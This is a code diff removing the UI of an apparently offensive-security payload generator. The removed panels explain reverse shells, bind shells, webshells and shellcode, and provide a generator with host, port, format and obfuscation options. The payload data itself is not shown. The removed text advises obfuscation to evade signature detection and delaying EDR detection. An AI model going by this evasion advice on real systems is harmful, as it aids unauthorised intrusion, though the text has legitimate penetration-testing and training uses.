-          <div className="bg-ghost-surface border border-red-600/20 border-t-0 rounded-b-xl p-6 space-y-4 text-sm text-ghost-text leading-relaxed animate-slideDown">
-            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-              {/* Column 1 - Definition */}
-              <div className="space-y-3">
-                <div className="flex items-center gap-2">
-                  <div className="w-1 h-8 bg-red-600 rounded-full"></div>
-                  <h3 className="text-red-400 font-bold text-base">What is a Payload?</h3>
-                </div>
-                <p className="text-ghost-text-dim pl-3">
-                  In cybersecurity, a <span className="text-red-400 font-semibold">payload</span> is the component of a malicious 
-                  program or exploit that performs the actual harmful action. It's the "cargo" delivered by an exploit's delivery 
-                  mechanism (the "vector").
-                </p>
-                <div className="bg-ghost-bg/50 border border-ghost-border rounded-lg p-3 mt-2">
-                  <code className="text-xs text-ghost-cyan">
-                    Exploit (Vector) → Delivery → <span className="text-red-400 font-bold">Payload</span> (Action)
-                  </code>
-                </div>
-              </div>
-
-              {/* Column 2 - Types */}
-              <div className="space-y-3">
-                <div className="flex items-center gap-2">
-                  <div className="w-1 h-8 bg-cyan-400 rounded-full"></div>
-                  <h3 className="text-cyan-400 font-bold text-base">Common Payload Types</h3>
-                </div>
-                <ul className="space-y-2 text-ghost-text-dim pl-3">
-                  <li className="flex items-start gap-2">
-                    <span className="text-cyan-400 mt-1">•</span>
-                    <div><span className="text-ghost-text font-medium">Reverse Shell:</span> Target connects back to attacker</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-cyan-400 mt-1">•</span>
-                    <div><span className="text-ghost-text font-medium">Bind Shell:</span> Target listens for incoming connection</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-cyan-400 mt-1">•</span>
-                    <div><span className="text-ghost-text font-medium">WebShell:</span> Web-based command execution interface</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-cyan-400 mt-1">•</span>
-                    <div><span className="text-ghost-text font-medium">Meterpreter:</span> Advanced post-exploitation framework</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-cyan-400 mt-1">•</span>
-                    <div><span className="text-ghost-text font-medium">Shellcode:</span> Raw machine code for memory injection</div>
-                  </li>
-                </ul>
-              </div>
-
-              {/* Column 3 - Best Practices */}
-              <div className="space-y-3">
-                <div className="flex items-center gap-2">
-                  <div className="w-1 h-8 bg-emerald-400 rounded-full"></div>
-                  <h3 className="text-emerald-400 font-bold text-base">Best Practices</h3>
-                </div>
-                <ul className="space-y-2 text-ghost-text-dim pl-3">
-                  <li className="flex items-start gap-2">
-                    <span className="text-emerald-400 mt-1">✓</span>
-                    <div>Always <span className="text-ghost-text font-medium">test</span> payloads in isolated lab environments first</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-emerald-400 mt-1">✓</span>
-                    <div>Use <span className="text-ghost-text font-medium">obfuscation</span> to bypass signature-based detection</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-emerald-400 mt-1">✓</span>
-                    <div><span className="text-ghost-text font-medium">Verify</span> payloads are functional before deployment</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-emerald-400 mt-1">✓</span>
-                    <div>Always have a <span className="text-ghost-text font-medium">fallback</span> listener ready</div>
-                  </li>
-                  <li className="flex items-start gap-2">
-                    <span className="text-emerald-400 mt-1">✓</span>
-                    <div>Stay <span className="text-ghost-text font-medium">legal</span> — only test on systems you own or have permission</div>
-                  </li>
-                </ul>
-              </div>
-            </div>
-
-            {/* Bottom row - Key Concepts */}
-            <div className="border-t border-ghost-border pt-4 mt-2">
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
-                <div className="bg-ghost-bg/30 border border-ghost-border rounded-lg p-3">
-                  <div className="text-amber-400 font-bold mb-1">🎯 Staged vs Stageless</div>
-                  <p className="text-ghost-text-dim">
-                    <span className="text-ghost-text">Staged:</span> Small initial payload downloads the full payload later. 
-                    <span className="text-ghost-text ml-2">Stageless:</span> Everything is included in one file.
-                  </p>
-                </div>
-                <div className="bg-ghost-bg/30 border border-ghost-border rounded-lg p-3">
-                  <div className="text-amber-400 font-bold mb-1">🔒 Encryption Matters</div>
-                  <p className="text-ghost-text-dim">
-                    Encrypted payloads (HTTPS, AES) evade network detection but require more complex listeners. 
-                    <span className="text-ghost-text ml-2">Trade-off: Stealth vs Complexity.</span>
-                  </p>
-                </div>
-                <div className="bg-ghost-bg/30 border border-ghost-border rounded-lg p-3">
-                  <div className="text-amber-400 font-bold mb-1">📊 Detection Reality</div>
-                  <p className="text-ghost-text-dim">
-                    Most payloads are <span className="text-ghost-text">detectable</span> by modern EDR. The goal is 
-                    <span className="text-ghost-text ml-1">delaying detection</span> long enough to achieve objectives.
-                  </p>
-                </div>
-              </div>
-            </div>
-
-            <div className="text-xs text-ghost-text-dim/70 mt-2 text-center border-t border-ghost-border/50 pt-3">
-              <span className="text-red-400">⚠️</span> This information is for <span className="text-ghost-text font-medium">educational and authorized testing</span> purposes only. 
-              Unauthorized use of payloads is illegal.
-            </div>
-          </div>
-        )}
-      </div>
-
-      {/* ENCYCLOPEDIA TAB */}
-      {activeTab === 'encyclopedia' && (
-        <div>
-          <div className="mb-6">
-            <h2 className="text-2xl font-semibold mb-2">Payload Encyclopedia</h2>
-            <p className="text-ghost-text-dim">Learn what each payload does, when to use it, and how it works. Click on a card to expand for deep dive details.</p>
-          </div>
-
-          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-            {PAYLOAD_ENCYCLOPEDIA.map((payload) => {
-              const isExpanded = expandedPayloads.has(payload.type)
-              return (
-                <div
-                  key={payload.type}
-                  className={`ghost-card p-6 rounded-2xl border ${isExpanded ? 'border-red-600/50 bg-ghost-surface/30' : 'border-ghost-border hover:border-red-600/30'} transition-all group cursor-pointer`}
-                  onClick={() => toggleExpand(payload.type)}
-                >
-                  <div className="flex items-start justify-between mb-4">
-                    <div className={`${payload.color} group-hover:scale-110 transition-transform`}>
-                      {payload.icon}
-                    </div>
-                    <div className="flex items-center gap-2" onClick={e => e.stopPropagation()}>
-                      <div className="text-xs px-3 py-1 rounded-full bg-ghost-surface border border-ghost-border">
-                        {payload.supportedFormats.length} formats
-                      </div>
-                      {isExpanded ? <ChevronUp size={18} className="text-ghost-text-dim" /> : <ChevronDown size={18} className="text-ghost-text-dim" />}
-                    </div>
-                  </div>
-
-                  <h3 className="text-xl font-bold mb-1">{payload.name}</h3>
-                  <p className="text-ghost-text-dim text-sm mb-4">{payload.description}</p>
-
-                  <div className="space-y-3 text-sm">
-                    <div>
-                      <div className="text-red-400 text-xs font-mono mb-1">WHAT IT DOES</div>
-                      <p className="text-ghost-text-dim">{payload.whatItDoes}</p>
-                    </div>
-                    <div>
-                      <div className="text-red-400 text-xs font-mono mb-1">WHERE TO USE</div>
-                      <p className="text-ghost-text-dim">{payload.whereToUse}</p>
-                    </div>
-                  </div>
-
-                  {isExpanded && (
-                    <div className="mt-6 pt-4 border-t border-ghost-border space-y-4 animate-in slide-in-from-top-4 duration-200">
-                      <div>
-                        <div className="text-cyan-400 text-xs font-mono mb-1 flex items-center gap-1"><Lightbulb size={14} /> HOW IT WORKS</div>
-                        <p className="text-sm text-ghost-text-dim leading-relaxed">{payload.howItWorks}</p>
-                      </div>
-                      <div>
-                        <div className="text-amber-400 text-xs font-mono mb-1">EXAMPLE SCENARIO</div>
-                        <p className="text-sm text-ghost-text-dim">{payload.exampleScenario}</p>
-                      </div>
-                      <div>
-                        <div className="text-emerald-400 text-xs font-mono mb-1">LISTENER COMMAND</div>
-                        <code className="text-xs bg-ghost-bg px-3 py-2 rounded block font-mono text-ghost-cyan break-all">
-                          {payload.commonListenerCommand}
-                        </code>
-                      </div>
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <div className="text-red-400 text-xs font-mono mb-1 flex items-center gap-1"><AlertCircle size={14} /> DETECTION INDICATORS</div>
-                          <ul className="text-xs text-ghost-text-dim list-disc list-inside space-y-0.5">
-                            {payload.detectionIndicators.map((item, i) => <li key={i}>{item}</li>)}
-                          </ul>
-                        </div>
-                        <div>
-                          <div className="text-blue-400 text-xs font-mono mb-1 flex items-center gap-1"><CheckCircle size={14} /> MITIGATION TIPS</div>
-                          <ul className="text-xs text-ghost-text-dim list-disc list-inside space-y-0.5">
-                            {payload.mitigationTips.map((item, i) => <li key={i}>{item}</li>)}
-                          </ul>
-                        </div>
-                      </div>
-                      <div>
-                        <div className="text-ghost-text-dim text-xs font-mono mb-1">REFERENCES</div>
-                        <ul className="text-xs text-ghost-text-dim list-disc list-inside">
-                          {renderReferences(payload.references)}
-                        </ul>
-                      </div>
-                      {!payload.isComplete && (
-                        <div className="text-xs text-amber-400 flex items-center gap-1">
-                          <AlertCircle size={14} /> Template only — may need completion for production use
-                        </div>
-                      )}
-                      <button
-                        onClick={(e) => {
-                          e.stopPropagation()
-                          handlePayloadChange(payload.type)
-                          setActiveTab('generator')
-                        }}
-                        className="text-xs flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-700/10 hover:bg-red-700/20 text-red-400 transition-colors"
-                      >
-                        <Play size={14} /> Generate this payload
-                      </button>
-                    </div>
-                  )}
-
-                  <div className="mt-4 pt-4 border-t border-ghost-border flex justify-between items-center">
-                    <span className="text-xs text-ghost-text-dim">{isExpanded ? 'Click to collapse' : 'Click for deep dive'}</span>
-                    <span className="text-xs text-ghost-text-dim flex items-center gap-1">
-                      {payload.pros.length} pros · {payload.cons.length} cons
-                    </span>
-                  </div>
-                </div>
-              )
-            })}
-          </div>
-        </div>
-      )}
-
-      {/* GENERATOR TAB */}
-      {activeTab === 'generator' && currentPayloadInfo && (
-        <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
-          <div className="xl:col-span-5 space-y-6">
-            <div className="ghost-panel p-6 rounded-2xl">
-              <div className="flex justify-between items-center mb-4">
-                <h3 className="font-semibold flex items-center gap-2">
-                  <Target size={18} /> Payload Configuration
-                </h3>
-                <button
-                  onClick={() => {
-                    setLhost('10.10.14.5')
-                    setLport(currentPayloadInfo.defaultPort)
-                    setFormat(currentPayloadInfo.supportedFormats[0])
-                    setObfuscation('none')
-                    setGeneratedPayload('')
-                    setShowRaw(false)
-                    setLhostError(null)
-                    setLportError(null)
-                  }}
-                  className="text-xs text-ghost-text-dim hover:text-white transition-colors"
-                >
-                  Reset
-                </button>
-              </div>
-
-              <div className="mb-4">
-                <label className="text-xs text-ghost-text-dim block mb-2">Payload Type</label>
-                <select
-                  value={selectedPayload}
-                  onChange={(e) => handlePayloadChange(e.target.value as PayloadType)}
-                  className={selectClass}
-                >
-                  {Object.entries(payloadCategories).map(([category, payloads]) => (
-                    <optgroup key={category} label={category}>
-                      {payloads.map(p => (
-                        <option key={p.type} value={p.type}>{p.name}</option>
-                      ))}
-                    </optgroup>
-                  ))}
-                </select>
-              </div>
-
-              <div className="mb-6 p-4 bg-ghost-bg rounded-xl border border-ghost-border">
-                <div className="flex items-center gap-3 mb-3">
-                  <div className={currentPayloadInfo.color}>{currentPayloadInfo.icon}</div>
-                  <div>
-                    <div className="font-semibold">{currentPayloadInfo.name}</div>
-                    <div className="text-xs text-ghost-text-dim">{currentPayloadInfo.description}</div>
-                  </div>
-                </div>
-                <div className="text-xs text-ghost-text-dim space-y-1">
-                  <div><strong className="text-red-400">Where to use:</strong> {currentPayloadInfo.whereToUse}</div>
-                  <div><strong className="text-red-400">How it works:</strong> <span className="italic">{currentPayloadInfo.howItWorks.slice(0, 120)}...</span></div>
-                  <div><strong className="text-red-400">Listener:</strong> <code className="text-ghost-cyan bg-ghost-bg px-1 py-0.5 rounded">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code></div>
-                </div>
-                {!currentPayloadInfo.isComplete && (
-                  <div className="mt-2 text-xs text-amber-400 flex items-center gap-1">
-                    <AlertCircle size={12} /> Template only — may need completion for production use
-                  </div>
-                )}
-              </div>
-
-              <div className="grid grid-cols-2 gap-4 mb-4">
-                <div>
-                  <label className="text-xs text-ghost-text-dim block mb-1">LHOST</label>
-                  <input
-                    type="text"
-                    value={lhost}
-                    onChange={(e) => handleLhostChange(e.target.value)}
-                    disabled={!currentPayloadInfo.requiresLhost}
-                    placeholder={currentPayloadInfo.requiresLhost ? "10.10.14.5" : "Not required"}
-                    className={`${inputClass} disabled:opacity-50`}
-                  />
-                  {lhostError && <div className="text-xs text-red-400 mt-1">{lhostError}</div>}
-                </div>
-                <div>
-                  <label className="text-xs text-ghost-text-dim block mb-1">LPORT</label>
-                  <input
-                    type="number"
-                    min="1"
-                    max="65535"
-                    value={lport}
-                    onChange={(e) => handleLportChange(e.target.value)}
-                    disabled={!currentPayloadInfo.requiresLport}
-                    placeholder={currentPayloadInfo.requiresLport ? "4444" : "Not required"}
-                    className={`${inputClass} disabled:opacity-50`}
-                  />
-                  {lportError && <div className="text-xs text-red-400 mt-1">{lportError}</div>}
-                </div>
-              </div>
-
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <label className="text-xs text-ghost-text-dim block mb-1">Output Format</label>
-                  <select
-                    value={format}
-                    onChange={(e) => setFormat(e.target.value as OutputFormat)}
-                    className={selectClass}
-                  >
-                    {currentPayloadInfo.supportedFormats.map(f => (
-                      <option key={f} value={f}>{f}</option>
-                    ))}
-                  </select>
-                </div>
-                <div>
-                  <label className="text-xs text-ghost-text-dim block mb-1">Obfuscation</label>
-                  <select
-                    value={obfuscation}
-                    onChange={(e) => setObfuscation(e.target.value as ObfuscationLevel)}
-                    className={selectClass}
-                  >
-                    <option value="none">None</option>
-                    <option value="light">Light</option>
-                    <option value="medium">Medium</option>
-                    <option value="heavy">Heavy</option>
-                  </select>
-                  {obfuscation !== 'none' && !OBFUSCATION_SUPPORTED_FORMATS.includes(format) && (
-                    <div className="text-xs text-amber-400 mt-1 flex items-center gap-1">
-                      <AlertCircle size={12} /> Obfuscation not supported for {format}
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-
-            <button
-              onClick={generate}
-              className="w-full py-4 bg-gradient-to-r from-red-700 to-red-900 hover:brightness-110 rounded-2xl font-bold flex items-center justify-center gap-3 text-lg transition-all"
-            >
-              Generate Payload <Zap />
-            </button>
-          </div>
-
-          <div className="xl:col-span-7">
-            <div className="ghost-panel rounded-2xl border border-ghost-border p-6 h-full flex flex-col">
-              <div className="flex justify-between items-center mb-4">
-                <h3 className="font-semibold flex items-center gap-2">
-                  <Code size={18} /> Generated Payload
-                </h3>
-                {generatedPayload && (
-                  <div className="flex gap-2 flex-wrap">
-                    <button onClick={() => setShowRaw(!showRaw)} className="text-xs px-3 py-1.5 rounded-lg border border-ghost-border flex items-center gap-1.5">
-                      {showRaw ? <EyeOff size={14} /> : <Eye size={14} />} {showRaw ? 'Formatted' : 'Raw'}
-                    </button>
-                    <button onClick={() => copyToClipboard(generatedPayload)} className="text-xs px-3 py-1.5 rounded-lg border border-ghost-border flex items-center gap-1.5 hover:bg-white/5">
-                      {copyStatus === 'success' ? <><CheckCircle size={14} /> Copied!</> : 
-                       copyStatus === 'error' ? <><AlertCircle size={14} /> Failed</> :
-                       copyStatus === 'manual' ? <><Copy size={14} /> Select Manually</> :
-                       <><Copy size={14} /> Copy</>}
-                    </button>
-                    <button onClick={downloadPayload} className="text-xs px-3 py-1.5 rounded-lg bg-red-700/10 text-red-400 flex items-center gap-1.5">
-                      <Download size={14} /> Download
-                    </button>
-                  </div>
-                )}
-              </div>
-
-              <div className="flex-1 bg-ghost-bg rounded-xl p-4 overflow-auto font-mono text-sm border border-ghost-border min-h-[280px]">
-                {generatedPayload ? (
-                  <pre className="whitespace-pre-wrap break-all">
-                    {showRaw ? generatedPayload : generatedPayload
-                      .split('\n')
-                      .map((line, i) => <div key={i} className="leading-relaxed break-all">{line || '\u00A0'}</div>)}
-                  </pre>
-                ) : (
-                  <div className="h-full flex items-center justify-center text-center text-ghost-text-dim">
-                    <div>
-                      <Swords size={48} className="mx-auto mb-4 opacity-30" />
-                      <p>Click "Generate Payload" to create your payload</p>
-                    </div>
-                  </div>
-                )}
-              </div>
-
-              {generatedPayload && (
-                <div className="mt-4 p-4 bg-ghost-surface rounded-xl text-sm">
-                  <div className="font-semibold text-red-400 mb-2 flex items-center gap-2">
-                    <Lightbulb size={16} /> Quick Usage Guide
-                  </div>
-                  <p className="text-ghost-text-dim">{currentPayloadInfo.howToUse}</p>
-                  <div className="mt-2 text-xs text-ghost-text-dim">
-                    <span className="text-ghost-text">Listener:</span> <code className="bg-ghost-bg px-2 py-1 rounded">{substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}</code>
-                  </div>
-                  <div className="mt-2 grid grid-cols-2 gap-2 text-xs">
-                    <div className="border border-emerald-500/20 rounded p-2 bg-emerald-500/5">
-                      <div className="text-emerald-400 font-mono text-xs">PROS</div>
-                      <ul className="list-disc list-inside text-ghost-text-dim mt-1 space-y-0.5">
-                        {currentPayloadInfo.pros.slice(0, 2).map((p, i) => <li key={i}>{p}</li>)}
-                      </ul>
-                    </div>
-                    <div className="border border-red-700/20 rounded p-2 bg-red-700/5">
-                      <div className="text-rose-400 font-mono text-xs">CONS</div>
-                      <ul className="list-disc list-inside text-ghost-text-dim mt-1 space-y-0.5">
-                        {currentPayloadInfo.cons.slice(0, 2).map((c, i) => <li key={i}>{c}</li>)}
-                      </ul>
-                    </div>
-                  </div>
-                </div>
-              )}
-            </div>
-          </div>
-        </div>
-      )}
+      <style dangerouslySetInnerHTML={{ __html: `
+        .custom-scrollbar::-webkit-scrollbar { width: 3px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
+        @keyframes slideDown {
+          from { opacity: 0; transform: translateY(-10px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-slideDown { animation: slideDown 0.25s ease-out; }
+      `}} />
     </div>
   )
 }
